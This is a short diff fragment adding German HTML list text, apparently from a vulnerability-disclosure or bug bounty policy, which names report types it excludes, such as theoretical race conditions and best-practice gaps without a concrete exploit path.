+ohne PII, theoretische Race Conditions, Dependency-Aktualität,
+Memory-Safety in JVM-Sprachen, Best-Practice-Mängel ohne konkreten
+Exploit-Pfad.</li>
+</ul>
